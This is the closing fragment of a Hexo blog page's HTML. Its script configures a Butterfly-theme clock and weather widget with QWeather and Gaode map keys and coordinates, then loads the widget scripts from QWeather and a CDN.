  var qweather_key = 'b16a1fa0e63c46a4b8f28abfb06ae3fe';
  var gaud_map_key = 'e2b04289e870b005374ee030148d64fd&s=rsv3';
  var baidu_ak_key = 'undefined';
  var flag = 0;
  var clock_rectangle = '112.6534116,27.96920845';
  var clock_default_rectangle_enable = 'false';

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_clock_anzhiyu_injector_config();
  }
  else if (epage === cpage){
    butterfly_clock_anzhiyu_injector_config();
  }
  </script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.js"></script><!-- hexo injector body_end end --></body></html>